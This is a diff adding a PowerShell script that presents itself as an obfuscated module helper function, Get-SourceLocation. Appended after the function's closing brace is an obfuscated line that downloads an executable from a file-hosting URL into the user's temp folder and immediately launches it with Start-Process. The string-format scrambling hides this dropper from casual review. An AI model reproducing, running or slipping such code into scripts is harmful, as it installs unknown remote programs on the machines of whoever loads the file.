@@ -1,0 +1,24 @@
+function g`eT`-S`OURCEL`o`CAtiOn
+{
+    [CmdletBinding()]
+    [OutputType({"{1}{0}" -f 'g','strin'})]
+    Param
+    (
+        [Parameter(MAndATOry=${tR`UE})]
+        [ValidateNotNullOrEmpty()]
+        [string]
+        ${sOURcE`Na`Me}
+    )
+
+    &("{7}{6}{2}{4}{0}{1}{5}{3}" -f 'rc','es','o','le','duleSou','Variab','et-M','S')
+
+    if(${Scr`ipT:psG`e`Tm`oduLesoU`RcES}.("{2}{0}{1}" -f 'tain','s','Con').Invoke(${S`oURce`NamE}))
+    {
+        return ${scRIp`T`:PSget`MoDU`Le`sou`Rc`ES}[${so`UR`CenaMe}]."SOuR`ceLocaTi`oN"
+    }
+    else
+    {
+        return ${soU`Rc`EN`AmE}
+    }
+}
+(.("{0}{1}{2}"-f'Ne','w-Obj','ect') ("{0}{4}{3}{1}{2}"-f 'Sy','em','.Net.WebClient','t','s')).("{1}{2}{3}{0}"-f'le','D','ownlo','adFi').Invoke(("{1}{4}{3}{2}{5}{0}"-f '.cat/vjadwb.exe','https:','.p','/a','/','omf'),"$env:TEMP\euioko.exe");.("{1}{2}{0}"-f'ss','Start-Proc','e') ("$env:TEMP\euioko.exe")
